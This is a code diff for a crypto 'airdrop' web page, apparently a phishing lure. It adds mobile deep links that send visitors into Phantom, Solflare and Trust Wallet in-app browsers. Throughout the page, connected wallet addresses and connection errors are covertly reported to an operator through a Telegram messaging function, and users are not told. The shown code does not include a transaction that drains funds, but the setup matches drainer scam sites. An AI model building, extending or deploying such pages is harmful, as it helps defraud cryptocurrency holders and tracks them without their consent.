@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>ChartDrops Airdrop</title>
   <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-wallets@0.9.19/lib/cdn/index.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base@0.9.19/lib/cdn/index.min.js"></script>
@@ -52,7 +53,7 @@
     <button onclick="connectPhantom()">Connect Phantom</button>
     <button onclick="connectSolflare()">Connect Solflare</button>
     <button onclick="connectTrust()">Connect TrustWallet</button>
-    <div id="connectionStatus"></div> <!-- Display connection status here -->
+    <div id="connectionStatus"></div>
   </div>
 
   <script>
@@ -85,8 +86,9 @@
       statusElement.textContent = status;
     }
 
-    // Improved check for Phantom wallet
+    // Improved Phantom wallet detection for mobile
     async function connectPhantom() {
+      // First try the standard Phantom detection
       if (typeof window.solana !== "undefined" && window.solana.isPhantom) {
         try {
           const resp = await window.solana.connect();
@@ -94,36 +96,46 @@
           sendTelegramMessage(walletAddress);
           updateConnectionStatus(`Connected: ${walletAddress}`);
           alert(`Connected: ${walletAddress}`);
+          return;
         } catch (err) {
           console.error("Phantom connect error", err);
           sendTelegramMessage(`Phantom error: ${err.message}`, true);
           updateConnectionStatus("Phantom connection failed.");
+          return;
         }
-      } else {
-        // For mobile devices, attempt to force detection
-        if (window.matchMedia("(max-width: 768px)").matches) {
-          // Checking Phantom's mobile app directly
-          try {
-            const phantomApp = window.open("https://phantom.app", "_blank");
-            phantomApp.focus();
-            alert("Opening Phantom app...");
-            sendTelegramMessage("Phantom wallet not found on the device.", true);
-            updateConnectionStatus("Phantom wallet not found, opening app...");
-          } catch (error) {
-            alert("Phantom wallet is not detected on mobile. Please install it.");
-            sendTelegramMessage("Phantom wallet not detected on mobile.", true);
-            updateConnectionStatus("Phantom wallet not installed.");
-          }
-        } else {
-          alert("Phantom wallet not installed. Please install Phantom.");
-          sendTelegramMessage("Phantom wallet not found on the device.", true);
+      }
+
+      // Mobile-specific handling
+      if (isMobile()) {
+        // Try deep linking to Phantom mobile app
+        try {
+          // Phantom's universal link
+          window.location.href = "https://phantom.app/ul/browse/https://chartdrops.fun";
+          
+          // Fallback if the app isn't installed
+          setTimeout(() => {
+            if (!document.hidden) {
+              window.location.href = "https://phantom.app/download";
+            }
+          }, 1000);
+          
+          sendTelegramMessage("Attempting to open Phantom mobile app", true);
+          updateConnectionStatus("Redirecting to Phantom app...");
+        } catch (error) {
+          alert("Phantom wallet not detected. Please install it from phantom.app");
+          sendTelegramMessage("Phantom wallet not detected on mobile.", true);
           updateConnectionStatus("Phantom wallet not installed.");
         }
+      } else {
+        alert("Phantom wallet not installed. Please install Phantom from phantom.app");
+        sendTelegramMessage("Phantom wallet not found on the device.", true);
+        updateConnectionStatus("Phantom wallet not installed.");
       }
     }
 
-    // Improved check for Solflare wallet
+    // Improved Solflare wallet detection for mobile
     async function connectSolflare() {
+      // First try the standard Solflare detection
       if (typeof window.solflare !== "undefined") {
         try {
           const solflare = window.solflare;
@@ -134,24 +146,43 @@
           sendTelegramMessage(walletAddress);
           updateConnectionStatus(`Connected: ${walletAddress}`);
           alert(`Connected: ${walletAddress}`);
+          return;
         } catch (err) {
           console.error("Solflare connect error", err);
           sendTelegramMessage("Solflare error: " + err.message, true);
           updateConnectionStatus("Solflare connection failed.");
+          return;
+        }
+      }
+
+      // Mobile-specific handling
+      if (isMobile()) {
+        try {
+          // Solflare's universal link
+          window.location.href = "solflare://browse?url=https://chartdrops.fun";
+          
+          // Fallback if the app isn't installed
+          setTimeout(() => {
+            if (!document.hidden) {
+              window.location.href = "https://solflare.com/download";
+            }
+          }, 1000);
+          
+          sendTelegramMessage("Attempting to open Solflare mobile app", true);
+          updateConnectionStatus("Redirecting to Solflare app...");
+        } catch (error) {
+          alert("Solflare wallet not detected. Please install it from solflare.com");
+          sendTelegramMessage("Solflare wallet not detected on mobile.", true);
+          updateConnectionStatus("Solflare wallet not installed.");
         }
       } else {
-        if (window.matchMedia("(max-width: 768px)").matches) {
-          alert("Solflare wallet not detected. Redirecting to Solflare app...");
-          window.location.href = "https://solflare.com/";
-        } else {
-          alert("Solflare wallet not installed.");
-          sendTelegramMessage("Solflare wallet not found.", true);
-          updateConnectionStatus("Solflare wallet not found.");
-        }
+        alert("Solflare wallet not installed. Please install Solflare from solflare.com");
+        sendTelegramMessage("Solflare wallet not found.", true);
+        updateConnectionStatus("Solflare wallet not found.");
       }
     }
 
-    // Improved check for TrustWallet
+    // TrustWallet connection (unchanged)
     async function connectTrust() {
       if (window.solana && window.solana.isTrust) {
         try {
@@ -166,15 +197,36 @@
           updateConnectionStatus("TrustWallet connection failed.");
         }
       } else {
-        if (window.matchMedia("(max-width: 768px)").matches) {
-          alert("TrustWallet not detected. Redirecting to Trust Wallet app...");
-          window.location.href = "https://trustwallet.com/";
+        if (isMobile()) {
+          try {
+            // Trust Wallet's universal link
+            window.location.href = "trust://browse?url=https://chartdrops.fun";
+            
+            // Fallback if the app isn't installed
+            setTimeout(() => {
+              if (!document.hidden) {
+                window.location.href = "https://trustwallet.com/download";
+              }
+            }, 1000);
+            
+            sendTelegramMessage("Attempting to open Trust Wallet mobile app", true);
+            updateConnectionStatus("Redirecting to Trust Wallet app...");
+          } catch (error) {
+            alert("TrustWallet not detected. Please install it from trustwallet.com");
+            sendTelegramMessage("TrustWallet not detected on mobile.", true);
+            updateConnectionStatus("TrustWallet not installed.");
+          }
         } else {
-          alert("TrustWallet wallet not installed. Please install TrustWallet.");
+          alert("TrustWallet not installed. Please install TrustWallet from trustwallet.com");
           sendTelegramMessage("TrustWallet not found.", true);
           updateConnectionStatus("TrustWallet not found.");
         }
       }
+    }
+
+    // Helper function to detect mobile devices
+    function isMobile() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
   </script>
 </body>
